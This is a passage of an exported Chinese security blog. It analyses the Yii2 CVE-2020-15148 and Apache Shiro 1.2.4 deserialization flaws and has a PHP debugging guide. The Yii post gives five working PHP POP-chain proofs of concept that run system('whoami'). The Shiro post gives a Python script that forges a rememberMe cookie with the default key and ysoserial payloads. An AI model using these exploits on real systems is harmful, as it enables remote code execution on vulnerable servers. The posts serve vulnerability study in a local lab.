{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"friendship","date":"2020-08-29T16:34:40.000Z","updated":"2020-08-31T02:36:41.020Z","comments":true,"path":"friendship/index.html","permalink":"http://yoursite.com/friendship/index.html","excerpt":"","text":"张三李四是大佬，李四是大佬，李四是大佬，李四是大佬，李四是大佬李四我不是大佬，我不是大佬，我不是大佬，我不是大佬，我不是大佬王五我是小白 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"CVE-2020-15148 Yii框架反序列化","slug":"CVE-2020-15148 Yii框架反序列化","date":"2020-09-21T05:49:01.000Z","updated":"2020-09-22T14:51:20.768Z","comments":true,"path":"2020/09/21/CVE-2020-15148 Yii框架反序列化/","link":"","permalink":"http://yoursite.com/2020/09/21/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"环境搭建 yii下载地址 影响范围 Yii2 &lt; 2.0.38","text":"环境搭建 yii下载地址 影响范围 Yii2 &lt; 2.0.38 选择一个漏洞影响的版本 yii-basic-app-2.0.37.tgz下载后解压到 web 目录下，修改配置文件 config/web.php ，给 cookieValidationKey 字段设置一个值。 然后添加一个存在漏洞的 Action/controllers/TestController.php 1234567891011121314151617&lt;?phpnamespace app\\controllers;use Yii;use yii\\web\\Controller;class TestController extends Controller{ public function actionTest(){ $name = Yii::$app-&gt;request-&gt;get('unserialize'); return unserialize(base64_decode($name)); }}?&gt; 测试运行成功 漏洞分析 利用链 1 查看 github 的 commit 记录 发现在 /db/BatchQueryResult.php 中新增了 __wakeup() 方法，在 __wakeup() 方法中抛出异常。 unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 利用 __wakeup() 方法抛出一个异常，本质上是为了防止 BatchQueryResult 类被反序列化。 猜测 BatchQueryResult 类为反序列化的起点 vendor/yiisoft/yii2/db/BatchQueryResult.php::__destruct 1234567891011121314151617public function __destruct(){ // make sure cursor is closed $this-&gt;reset();}public function reset(){ if ($this-&gt;_dataReader !== null) { $this-&gt;_dataReader-&gt;close(); } $this-&gt;_dataReader = null; $this-&gt;_batch = null; $this-&gt;_value = null; $this-&gt;_key = null;} __destruct ( void ) : void析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 方法里面调用了 ```reset``` 方法， ```reset``` 方法里面又调用了 ```close``` 方法。12345678910111213141516171819```\\$this-&gt;_dataReader``` 的值可控，所以可以当作跳板去执行其他类中的魔术方法 ```__call()``` 方法。 &gt; public __call ( string $name , array $arguments ) : mixed &gt; 在对象中调用一个不可访问方法时，__call() 会被调用。 &gt; \\$name 参数是要调用的方法名称。\\$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数。![](20200921162407.png)了解 ```__call()``` 方法之后，我们就可以进行全局搜索，找到其中不包含 ```close```方法的类，就可以执行该类的```__call()``` 方法。全局搜索 ``` function __call( ``` ```vendor/fzaninotto/faker/src/Faker/Generator.php::__call``````phppublic function __call($method, $attributes) { return $this-&gt;format($method, $attributes); } 跟进 format vendor/fzaninotto/faker/src/Faker/Generator.php::format 1234public function format($formatter, $arguments = array()){ return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);} format 中调用了 call_user_func_array 方法 ，$formatter 与 $agruments 我们都不可控。此时 $formatter = close,$agruments为空。$formatter 传递至 getFormatter()vendor/fzaninotto/faker/src/Faker/Generator.php::getFormatter 1234567891011121314public function getFormatter($formatter){ if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; } foreach ($this-&gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-&gt;formatters[$formatter] = array($provider, $formatter); return $this-&gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));} 我们注意到在 getFormatter 方法中，$this-&gt;formatters[$formatter] 是我们可以控制的，getFormatter 方法返回值是可控的。那么 call_user_func_array 这个函数的第一个参数可控，第二个参数为空。此时我们就可以调用 yii 框架中的任何一个无参的方法了。 call_user_func_array ( callable $callback , array $param_arr ) : mixed把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的参数传入。调用类中的公共方法可以利用 call_user_func_array(['类名','类中的方法'],[]); 全局搜索 call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+), \\$this-&gt;([a-zA-Z0-9]+) 找到使用 call_user_func 函数，且参数为类中成员变量的所有方法。 利用其中的 vendor/yiisoft/yii2/rest/CreateAction.php::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} 以及 ```$this-&gt;id``` 都可控123456789101112131415161718192021所以利用链为：&gt; yii\\db\\BatchQueryResult::__destruct() &gt; yii\\db\\BatchQueryResult::reset() &gt; Faker\\Generator::__call() &gt; Faker\\Generator::format('close',[])&gt; call_user_func_array(['new yii\\rest\\CreateAction','run'],[]) &gt; yii\\rest\\CreateAction::run() &gt; call_user_func('system','whoami')```php$n = yii\\db\\BatchQueryResult{ $this-&gt;_dataReader = Faker\\Generator{ $this-&gt;formatters['close'] = [ yii\\rest\\CreateAction{ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } ,'run']; }} POC 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } }}namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));}?&gt; 利用链2 BatchQueryResult 类仍为反序列化的起点，不利用魔术方法 __call()，选择将 $this-&gt;_dataReader 赋值为一个存在 close 方法的类，找到该类中 close方法调用中存在代码执行。 \\yii2\\web\\DbSession::close 12345678public function close(){ if ($this-&gt;getIsActive()) { // prepare writeCallback fields before session closes $this-&gt;fields = $this-&gt;composeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); }} 当 $this-&gt;getIsActive() 为 true 时，则会调用 $this-&gt;composeFields()跟进 DbSession 的父类 MultiFieldSession 的父类 Session\\yii2\\web\\Session::getIsActive 1234public function getIsActive() { return session_status() === PHP_SESSION_ACTIVE; } 当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。默认安装情况下都返回true。跟进 composeFields 方法，在DbSession 的父类 MultiFieldSession 中实现\\yii\\web\\MultiFieldSession::composeFields 1234567891011protected function composeFields($id = null, $data = null){ $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : []; if ($id !== null) { $fields['id'] = $id; } if ($data !== null) { $fields['data'] = $data; } return $fields;} 发现调用了call_user_func函数， $this-&gt;writeCallback 可控，其余参数不可控。可以通过控制 $this-&gt;writeCallback 为 [‘类名’,’类中的方法’] 来实现调用类中的方法。 全局搜索 call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+) 利用其中的 \\yii\\rest\\IndexAction::run 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } return $this-&gt;prepareDataProvider();}``` 所以利用链为：&gt; yii\\db\\BatchQueryResult::__destruct() &gt; yii\\db\\BatchQueryResult::reset() &gt; yii\\web\\DbSession::close() &gt; yii\\web\\MultiFieldSession::composeFields() &gt; call_user_func_array(['new yii\\rest\\IndexAction','run'],[]) &gt; yii\\rest\\IndexAction::run() &gt; call_user_func('system','whoami')POC ```php&lt;?phpnamespace yii\\rest { class IndexAction { public $checkAccess; public $id; public function __construct() { $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace yii\\web { use yii\\rest\\IndexAction; class DbSession { public $writeCallback; public function __construct() { $this-&gt;writeCallback = [new IndexAction(), \"run\"]; } }}namespace yii\\db { use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct() { $this-&gt;_dataReader = new DbSession(); } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));} 利用链3 \\Codeception\\Extension\\RunProcess::__destruct 1234public function __destruct() { $this-&gt;stopProcess(); } \\Codeception\\Extension\\RunProcess::stopProcess 123456789101112public function stopProcess() { foreach (array_reverse($this-&gt;processes) as $process) { /** @var $process Process **/ if (!$process-&gt;isRunning()) { continue; } $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine()); $process-&gt;stop(); } $this-&gt;processes = []; } 注意到 RunProcess 中的 __destruct 方法调用了 stopProcess() 方法， stopProcess() 方法 中的 $this-&gt;processes 可控，则 $process 可控，下面调用了 $process-&gt;isRunning() ，则又可以利用魔术方法 __call()。 利用链 \\Codeception\\Extension\\RunProcess::__destruct()\\Codeception\\Extension\\RunProcess::stopProcess()Faker\\Generator::__call()Faker\\Generator::format(‘isRunning’,[])call_user_func_array([‘new yii\\rest\\CreateAction’,’run’],[])yii\\rest\\CreateAction::run()call_user_func(‘system’,’whoami’) poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run']; } }}namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct(){ $this-&gt;processes = [new Generator]; } }}namespace{ echo base64_encode(serialize(new Codeception\\Extension\\RunProcess));}?&gt;``` ***### 利用链4 ```\\Swift_KeyCache_DiskKeyCache::__destruct``````phppublic function __destruct(){ foreach ($this-&gt;keys as $nsKey =&gt; $null) { $this-&gt;clearAll($nsKey); }} \\Swift_KeyCache_DiskKeyCache::clearAll 123456789101112public function clearAll($nsKey){ if (array_key_exists($nsKey, $this-&gt;keys)) { foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) { $this-&gt;clearKey($nsKey, $itemKey); } if (is_dir($this-&gt;path.'/'.$nsKey)) { rmdir($this-&gt;path.'/'.$nsKey); } unset($this-&gt;keys[$nsKey]); }} 因为 $nsKey $this-&gt;keys 可控，跟进$this-&gt;clearKey(· \\Swift_KeyCache_DiskKeyCache::clearKey 1234567public function clearKey($nsKey, $itemKey){ if ($this-&gt;hasKey($nsKey, $itemKey)) { $this-&gt;freeHandle($nsKey, $itemKey); unlink($this-&gt;path.'/'.$nsKey.'/'.$itemKey); }} \\Swift_KeyCache_DiskKeyCache::hasKey 1234public function hasKey($nsKey, $itemKey){ return is_file($this-&gt;path.'/'.$nsKey.'/'.$itemKey);} 可控 ，进行了字符串的拼接操作，可以利用魔术方法 ```__toString``` 触发后续操作。123456789101112&gt;__toString() 方法用于一个类被当成字符串时应怎样回应。![](20200922162854.png)然后全局搜索 ```__toString``` 方法![](20200922163338.png)```\\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString``````phppublic function __toString() : string{ return $this-&gt;refers . ($this-&gt;description ? ' ' . $this-&gt;description-&gt;render() : '');} 可控，则又可以利用魔术方法 ```__call()```。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273利用链&gt; \\Swift_KeyCache_DiskKeyCache::__destruct() &gt; \\Swift_KeyCache_DiskKeyCache::clearAll() &gt; \\Swift_KeyCache_DiskKeyCache::clearKey() &gt; \\Swift_KeyCache_DiskKeyCache::hasKey() &gt; \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()&gt; \\Faker\\Generator::__call() &gt; \\Faker\\Generator::format('render',[])&gt; \\call_user_func_array(['new yii\\rest\\CreateAction','run'],[]) &gt; \\yii\\rest\\CreateAction::run() &gt; \\call_user_func('system','whoami')POC```php&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace { use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache { private $keys = []; private $path; public function __construct() { $this-&gt;path = new See; $this-&gt;keys = array( \"test\"=&gt;array(\"test\") ); } }}namespace{ echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));}?&gt; 利用链5 \\Symfony\\Component\\String\\UnicodeString::__wakeup 1234public function __wakeup(){ normalizer_is_normalized($this-&gt;string) ?: $this-&gt;string = normalizer_normalize($this-&gt;string);} 方法中 调用了 ```normalizer_is_normalized``` 方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172```normalizer_is_normalized``` 方法 会把参数当作字符串进行处理 ，并且```$this-&gt;string``` 可控。只需要寻找魔术方法 ```__toString``` 触发后续操作。&gt; normalizer_is_normalized 检查提供的字符串是否已经处于指定的规范化形式&gt; ![](20200922224404.png)利用链&gt; \\Symfony\\Component\\String\\UnicodeString::__wakeup &gt; normalizer_is_normalized()&gt; \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()&gt; \\Faker\\Generator::__call() &gt; \\Faker\\Generator::format('render',[])&gt; \\call_user_func_array(['new yii\\rest\\CreateAction','run'],[]) &gt; \\yii\\rest\\CreateAction::run() &gt; \\call_user_func('system','whoami')POC```php&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace Symfony\\Component\\String{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class UnicodeString { private $string; public function __construct() { $this-&gt;string = new See; } }}namespace{ echo base64_encode(serialize(new Symfony\\Component\\String\\UnicodeString()));}?&gt; 在执行 system(\"whoami\") 的命令时，会报错 yii 视图报错导致无法回显命令执行的结果，执行其他命令即可。 可能还会遇到大佬说的这个问题 PREG_UNMATCHED_AS_NULL ，REG_UNMATCHED_AS_NULL 这个静态变量存在于 php7.2 版本以上，更换 php 版本就可以解决这个问题。 我选择 php7.3.4 时利用成功，选择 php7.0.9 虽没利用成功，但没有详细的报错信息。 参考文章 CVE-2020-15148 Yii2反序列化RCE POP链分析我是怎么挖掘yii2反序列化0day的yii2反序列化后续怎样挖掘出属于自己的php反序列化链 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 1.2.4反序列化漏洞","slug":"Apache Shiro 1.2.4反序列化漏洞","date":"2020-08-31T06:37:52.000Z","updated":"2020-09-22T14:51:20.767Z","comments":true,"path":"2020/08/31/Apache Shiro 1.2.4反序列化漏洞/","link":"","permalink":"http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"漏洞简介 Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。","text":"漏洞简介 Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 SHIRO-550在识别身份的时候，需要对 Cookie 里的 RememberMe 字段解密,解密的顺序为： 检索cookie中RememberMe的值 Base64解码 使用AES解密 反序列化 但是，AES 加密的秘钥被硬编码在代码里，每个人通过源代码都可以拿到 AES 加密的密钥。所以当攻击者将恶意的 payload 进行序列化、AES 加密、base64 编码，作为 Cookie 的 RememberMe 字段发送。Shiro 将 RememberMe 进行解密并且反序列化，最终造成反序列化漏洞。 漏洞分析 获取 Apache Shiro 存在漏洞的源代码 123git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 修改 /shiro/samples/web/pom.xml 123456789101112&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 然后用idea导入mvn项目 设置run/debug configurations， 添加本地tomcat环境 在 org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin 处添加断点，然后debug 开启 tomcat 服务 加密过程 登录账户root/secret，勾选上Remember Me的按钮，程序会停在断点处，用户名和密码也会存储在 token 中forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject) 调用 forgetIdentity 构造方法处理 request 和 reponse 请求org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) 跟进 removeFrom 方法，在 response 响应头中加入了一些cookie信息。org.apache.shiro.web.servlet.SimpleCookie#removeFrom 回到 onSuccessfulLogin 调用 rememberIdentity 生成 cookie 中的 remember 字段。跟进 rememberIdentity 方法。org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo) 通过 getIdentityToRemember 获取用户的身份，继续跟进 rememberIdentity 方法。org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection) 调用 convertPrincipalsToBytes 方法将 accountPrincipals &lt;“root”&gt; 转换为字节形式，跟进 convertPrincipalsToBytes 方法。org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes 转换过程中首先对用户的 id 进行序列化，然后利用 encrypt 进行加密。org.apache.shiro.mgt.AbstractRememberMeManager#encrypt 加密的密钥由getEncryptionCipherKey()得到 getEncryptionCipherKey 实际上是开头中的 DEFAULT_CIPHER_KEY_BYTES 的常量 kPH+bIxk5D2deZiIxcaaaA== 密钥分析org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey 继续单步执行，返回 rememberIdentity 函数 跟进函数 rememberSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity对值进行 base64 编码之后，设置到 cookie 中。 当我们勾选 RememberMe 选项框之后，点击登陆之后，后端会进行如下操作。 序列化用户 id 对用户 id 进行 AES 加密，密钥为常量 base64 编码 设置到 cookie 中的 rememberme 字段 解密过程 在 org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 添加断点，然后发送一个带有 readmemberMe cookie的请求。 跟进函数 getRememberedPrincipalsorg.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals 调用 getRememberedSerializedIdentity 针对http请求进行处理，跟进 getRememberedSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity getCookie 构造方法先获取 cookie 信息,readValue 方法，根据 Cookie 中的 name 字段获取 Cookie 的值，然后返回 Cookie 的值 然后调用 byte[] decoded = Base64.decode(base64)处理 base64 加密的 Cookie 信息，并且将这个 Cookie 转化为二进制字节码 回到 getRememberedPrincipals，继续跟进 convertBytesToPrincipals 函数org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals AES 解密 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt 反序列化 org.apache.shiro.mgt.AbstractRememberMeManager#deserializeorg.apache.shiro.io.DefaultSerializer#deserialize看到 readObject() 当我们发送带有 readmemberMe cookie的请求，后端会进行如下操作。 读取 cookie 中 rememberMe 的值 base64 解码 进行 AES 解密，密钥为常量 反序列化 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64target = \"http://localhost:8080/samples_web_war/\"jar_file = 'F:\\\\Penetration\\\\ysoserial\\\\ysoserial-0.0.6-SNAPSHOT-all.jar'cipher_key = \"kPH+bIxk5D2deZiIxcaaaA==\"# 创建 rememberme的值popen = subprocess.Popen(['java','-jar',jar_file, \"URLDNS\", \"http://7zhfmm.dnslog.cn\"], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# 发送requesttry: r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)except: traceback.print_exc() 漏洞利用 commons-collections 3.2.1 shiro自带的commons-collections-3.2.1 、commons-beanutils-1.8.3 在JDK1.8u112中，可以直接利用 ysoserial 中的Commons-Collections5（3.1-3.2.1，jdk1.8） 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"clac\" 会报错提示 org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array. 回到 org.apache.shiro.io.DefaultSerializer#deserialize 我们发现在这里使用了 ClassResolvingObjectInputStream 类而非传统的 ObjectInputStream org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass java.io.ObjectInputStream#resolveClass ObjectInputStream 的 resolveClass 函数用的是Class.forName 类获取当前描述器所指代的类的Class对象 shiro 中 ClassResolvingObjectInputStream 继承了 ObjectInputStream，resolveClass 被重写，调用了 ClassUtils.forName 获取当前描述器所指代的类的Class对象 org.apache.shiro.util.ClassUtils#forName 看一下 ExceptionIgnoringAccessor 是如何是实现的org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor commons-collections 4.0 参考文章 Apache Shiro Java反序列化漏洞分析Shiro 1.2.4 RememberMe反序列化漏洞踩坑分析(CVE-2016-4437)Pwn a CTF Platform with Java JRMP Gadget document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"相关函数总结","slug":"相关函数总结","date":"2020-08-20T13:31:50.000Z","updated":"2020-09-22T14:51:20.770Z","comments":true,"path":"2020/08/20/相关函数总结/","link":"","permalink":"http://yoursite.com/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"PHP 相关函数","text":"PHP 相关函数 审计利用函数 var_dump() var_dump() 函数用于输出变量的相关信息。 任意文件下载 fread() fread() 函数读取文件（可安全用于二进制文件）fread(file,length) 参数 描述 file 必需。规定要读取打开文件。 length 必需。规定要读取的最大字节数。 123456789101112131415$path = \"../{$file}\";$handle = fopen($path, \"r\");header(\"Pragma: \");header(\"Cache-Control: \");header(\"Content-type: application/octet-stream; charset=utf-8\");header(\"Content-Disposition: attachment; filename=\\\"{$name}\\\"\");if ($handle) { while (!feof($handle)) { $read = fread($handle, 4096); print($read); }}pclose($handle); 变量覆盖 extrat() extract() 从数组中将变量导入到当前的符号表 命令执行 call_user_func_array() call_user_func_array(“system”,[“whoami”]); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"phpstorm进行PHP断点调试","slug":"phpstorm进行PHP断点调试","date":"2020-08-20T07:19:41.000Z","updated":"2020-09-22T14:51:20.769Z","comments":true,"path":"2020/08/20/phpstorm进行PHP断点调试/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"配置环境 phpstromphpstudy","text":"配置环境 phpstromphpstudy phpstrom 配置 php 环境 PHP安装xdebug扩展 注意版本：此时我们 php 的版本为 php5.6.9xdebug模块https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll 把下载成功的 php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll放在 E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext 文件夹下 同时在 php.ini 中添加如下配置 12345678910111213[xdebug]zend_extension=\"E:/Tools/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll\" ;指定Xdebug扩展文件的绝对路径xdebug.auto_trace=on ;启用代码自动跟踪xdebug.collect_params=on ;允许收集传递给函数的参数变量xdebug.collect_return=on ;允许收集函数调用的返回值xdebug.trace_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;指定堆栈跟踪文件的存放目录xdebug.profiler_enable=on ;是否启用Xdebug的性能分析，并创建性能信息文件xdebug.profiler_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;指定性能分析信息文件的输出目录xdebug.remote_enable = on ;是否开启远程调试xdebug.remote_handler = dbgp ;指定远程调试的处理协议xdebug.remote_host= localhost ;指定远程调试的主机名xdebug.remote_port = 9000 ;指定远程调试的端口号xdebug.idekey = PHPSTORM ;指定传递给DBGp调试器处理程序的IDE Key PHPStrom 配置 debug 环境 配置 Debug 端口 配置IDEKEY 配置Server 配置PHP Web Application 浏览器的xdebug插件 测试调试 加上断点，同时把小电话设置成为绿色的浏览器上的插件打开，同时访问要调试的页面 调试单个文件 调试单个文件时 配置PHP Web Application点击绿色的小虫子就可以进行调试了 就可以进行愉快的调式了！ 在进行调试时，经常遇到这个问题,xdebug断掉调试经常无故断开 如果针对某一个项目可以对项目的配置文件 vhosts.conf 中添加 12IPCConnectTimeout 3000IPCCommTimeout 3000 要对所有项目都进行配置时，可以修改httpd.conf document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"初识Java 